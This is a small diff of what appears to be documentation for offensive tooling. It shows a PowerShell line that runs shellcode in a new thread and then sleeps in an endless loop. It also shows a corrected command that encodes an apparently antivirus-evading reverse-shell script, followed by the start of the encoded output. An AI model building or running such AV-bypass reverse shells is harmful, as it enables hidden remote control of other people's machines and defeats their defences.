@@ -69,7 +69,7 @@ $windoof::CreateThread(0,0,$x,0,0,0);for (;;) { Start-sleep 60 };
 ```
 
 ```bash
-python3 tools/py-encode.py --script tools/av-bypass-resershell.ps1
+python3 tools/ps-encode.py --script tools/av-bypass-resershell.ps1
 JABjAG8AZABlACAAPQAgACcACgBbAEQAbABsAEkAbQBwAG8...
 ```
 
